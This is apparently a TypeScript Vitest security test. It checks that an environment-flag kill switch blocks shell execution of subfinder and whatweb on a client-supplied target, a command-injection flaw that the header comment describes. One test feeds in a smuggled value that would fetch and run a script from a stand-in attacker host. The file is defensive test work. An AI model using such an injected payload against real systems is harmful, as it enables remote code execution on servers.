/**
 * RCE stopgap verification (2026-07-21) — proves the unsafeReconToolsEnabled()
 * kill switch in lib/bounty-intelligence/index.ts actually blocks shell exec.
 * reconSubdomains()/reconTechnologies() shell out to subfinder/whatweb with the
 * client-supplied `target` from POST /api/bounty-intelligence/pipeline/run's
 * request body — stripped only by a naive protocol/path regex, never validated
 * or shell-escaped. Reached with REAL_TOOLS=true and no scope check at all.
 *
 * Uses the same promisify.custom child_process mock as the layer5-meta-agents
 * stopgap test, so every command execAsync would actually issue is visible.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';

const { execImpl } = vi.hoisted(() => ({
  execImpl: vi.fn(async (_cmd: string) => ({ stdout: '', stderr: '' })),
}));

vi.mock('child_process', () => {
  function exec(cmd: string, optsOrCb: any, cb?: any) {
    const callback = typeof optsOrCb === 'function' ? optsOrCb : cb;
    execImpl(cmd).then(
      (r: any) => callback(null, r.stdout, r.stderr),
      (e: any) => callback(e),
    );
  }
  (exec as any)[Symbol.for('nodejs.util.promisify.custom')] = execImpl;
  return { exec };
});

import { BountyIntelligenceService } from '../lib/bounty-intelligence';

// Skip the real constructor (ProgramFetcher.startAutoFetch(), file-system
// storage dirs, etc. — all irrelevant to this gate) — reconSubdomains() and
// reconTechnologies() only touch their own parameters and process.env.
function makeBareService(): any {
  return Object.create(BountyIntelligenceService.prototype);
}

const DOMAIN = 'example.test';

let prevFlag: string | undefined;
beforeEach(() => {
  prevFlag = process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS;
  delete process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS;
  execImpl.mockClear();
});
afterEach(() => {
  process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS = prevFlag;
});

describe('RCE stopgap — unsafeReconToolsEnabled() gate (flag OFF, default)', () => {
  it('reconSubdomains never execs subfinder and returns a placeholder', async () => {
    const svc = makeBareService();
    const result = await svc.reconSubdomains(DOMAIN, 'medium', /* isReal */ true);
    expect(execImpl).not.toHaveBeenCalled();
    expect(result).toEqual([{ hostname: DOMAIN, status: 200, title: `${DOMAIN} (unsafe-tool dispatch disabled)` }]);
  });

  it('reconTechnologies never execs whatweb and returns empty', async () => {
    const svc = makeBareService();
    const result = await svc.reconTechnologies(DOMAIN, /* isReal */ true);
    expect(execImpl).not.toHaveBeenCalled();
    expect(result).toEqual([]);
  });

  it('a domain crafted with shell metacharacters still never reaches exec()', async () => {
    const svc = makeBareService();
    const hostile = 'example.test$(curl attacker.test/s|sh)';
    await svc.reconSubdomains(hostile, 'medium', true);
    await svc.reconTechnologies(hostile, true);
    expect(execImpl).not.toHaveBeenCalled();
  });

  it('isReal=false never touches the gate or execs (simulation path unaffected)', async () => {
    const svc = makeBareService();
    const result = await svc.reconSubdomains(DOMAIN, 'shallow', false);
    expect(execImpl).not.toHaveBeenCalled();
    expect(result.length).toBeGreaterThan(0); // simulated prefixes, not the disabled placeholder
    expect(result[0].title).not.toMatch(/disabled/i);
  });
});

describe('RCE stopgap — flag ON (ALLOW_UNSAFE_SHELL_RECON_TOOLS=true) genuinely re-enables dispatch', () => {
  beforeEach(() => {
    process.env.ALLOW_UNSAFE_SHELL_RECON_TOOLS = 'true';
  });

  it('reconSubdomains reaches exec() when explicitly overridden', async () => {
    const svc = makeBareService();
    await svc.reconSubdomains(DOMAIN, 'medium', true);
    expect(execImpl).toHaveBeenCalled();
    expect(execImpl.mock.calls[0][0]).toContain('subfinder');
  });

  it('reconTechnologies reaches exec() when explicitly overridden', async () => {
    const svc = makeBareService();
    await svc.reconTechnologies(DOMAIN, true);
    expect(execImpl).toHaveBeenCalled();
    expect(execImpl.mock.calls[0][0]).toContain('whatweb');
  });
});
